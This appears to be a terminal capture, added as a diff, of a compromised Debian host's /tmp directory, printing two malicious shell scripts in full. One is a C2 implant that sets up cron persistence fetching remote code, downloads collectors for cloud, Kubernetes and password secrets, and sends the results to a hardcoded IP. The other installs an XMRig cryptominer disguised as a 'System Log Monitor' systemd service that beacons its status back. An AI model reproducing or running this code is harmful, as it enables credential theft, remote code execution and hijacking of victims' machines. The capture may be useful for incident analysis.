@@ -1,0 +1,106 @@
+root@debian:~# ls /tmp/
+b            nezha-agent_linux_amd64.zip                                                   systemd-private-a1895a04352a42d9803e89f9df864941-haveged.service-aJhJFb         xp.sh
+imp.sh       probe-agent                                                                   systemd-private-a1895a04352a42d9803e89f9df864941-ntpsec.service-dcILLs
+nezha-agent  systemd-private-a1895a04352a42d9803e89f9df864941-aurora@20002.service-LBvJct  systemd-private-a1895a04352a42d9803e89f9df864941-systemd-logind.service-DFKBD7
+root@debian:~# cat /tmp/imp.sh 
+#!/bin/sh
+# Nezha C2 Implant — persistence + all collectors
+# Deployed via Nezha cron @every 5m
+C2="http://152.42.182.35:8001"
+HOST=$(hostname 2>/dev/null || cat /etc/hostname 2>/dev/null || echo unknown)
+IP=$(ip addr show 2>/dev/null | grep 'inet ' | grep -v 127.0.0.1 | head -1 | awk '{print $2}' | cut -d/ -f1)
+OS=$(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '"')
+PAYLOAD_DIR="/tmp/.nz"
+mkdir -p "$PAYLOAD_DIR"
+
+# Self-persistence via cron (fallback if systemd not available)
+if ! grep -q "nz-implant" /etc/crontab 2>/dev/null && ! grep -q "nz-implant" /var/spool/cron/root 2>/dev/null; then
+  (crontab -l 2>/dev/null; echo "@daily curl -fsSL ${C2}/payloads/implant.sh | sh 2>/dev/null # nz-implant") | crontab - 2>/dev/null || true
+fi
+
+# Download all collectors
+for mod in aws gcp azure k8s fs passwords; do
+  curl -fsSL "${C2}/payloads/${mod}.sh" -o "${PAYLOAD_DIR}/${mod}.sh" 2>/dev/null
+done
+
+# Run collectors, collect results
+OUT="${PAYLOAD_DIR}/out.$$"
+cat > "$OUT" << HEADER
+{"host":"$HOST","ip":"$IP","os":"$OS","ts":"$(date -u +%Y-%m-%dT%H:%M:%SZ)","items":[
+HEADER
+
+FIRST=1
+for mod in aws gcp azure k8s fs passwords; do
+  script="${PAYLOAD_DIR}/${mod}.sh"
+  [ -f "$script" ] || continue
+  result=$(sh "$script" 2>/dev/null | head -c 262144)
+  [ -z "$result" ] && continue
+  encoded=$(echo "$result" | base64 -w0)
+  [ "$FIRST" = "0" ] && echo "," >> "$OUT"
+  FIRST=0
+  printf '{"mod":"%s","data":"%s"}' "$mod" "$encoded" >> "$OUT"
+done
+
+echo "]}" >> "$OUT"
+
+# Send to C2
+curl -s -m 10 --data-binary "@$OUT" "${C2}/recv.php" 2>/dev/null
+rm -f "$OUT"
+root@debian:~# cat /tmp/xp.sh 
+#!/bin/sh
+# XMRig Persistent Miner — systemd service, auto-restart, survives reboot
+WALLET="89e3WMT5FBwADCxEgtDBZRETYfwHbXNKgbX7VSVKNTmMYqAMbL4nQ3fHX2rJPu2rdRXdHP3kxDeiM3Psa1ikm6gaAZz684A"
+POOL="pool.hashvault.pro:443"
+C2="http://152.42.182.35:8001"
+BIN="/usr/local/bin/syslog-monitor"
+SVC="syslog-monitor"
+
+# Already installed?
+if systemctl is-active --quiet ${SVC} 2>/dev/null; then
+  curl -s "${C2}/recv.php" -d "XMR_RUNNING" 2>/dev/null
+  exit 0
+fi
+
+# Download
+mkdir -p /tmp/.x && cd /tmp/.x
+for url in \
+  "https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-linux-static-x64.tar.gz" \
+  "${C2}/xmrig.tar.gz"; do
+  curl -fsSL --connect-timeout 10 --max-time 90 "$url" -o x.tar.gz 2>/dev/null
+  [ -f x.tar.gz ] && [ "$(stat -c%s x.tar.gz 2>/dev/null)" -gt 10000 ] && break
+  rm -f x.tar.gz
+done
+
+[ ! -f x.tar.gz ] && { curl -s "${C2}/recv.php" -d "XMR_DL_FAIL"; exit 1; }
+
+tar xzf x.tar.gz --strip=1 2>/dev/null
+chmod +x xmrig
+cp xmrig "$BIN"
+rm -rf /tmp/.x
+
+# systemd service
+cat > "/etc/systemd/system/${SVC}.service" << EOF
+[Unit]
+Description=System Log Monitor
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=${BIN} -o ${POOL} -u ${WALLET} -p x --tls -k --cpu-max-threads-hint=50 --donate-level=0 --background
+Restart=always
+RestartSec=30
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+systemctl daemon-reload 2>/dev/null
+systemctl enable ${SVC} 2>/dev/null
+systemctl start ${SVC} 2>/dev/null
+
+if systemctl is-active --quiet ${SVC} 2>/dev/null; then
+  curl -s "${C2}/recv.php" -d "XMR_INSTALLED" 2>/dev/null
+else
+  nohup "$BIN" -o "$POOL" -u "$WALLET" -p x --tls -k --cpu-max-threads-hint=50 --donate-level=0 >/dev/null 2>&1 &
+  curl -s "${C2}/recv.php" -d "XMR_NO_SYSTEMD" 2>/dev/null
+fi
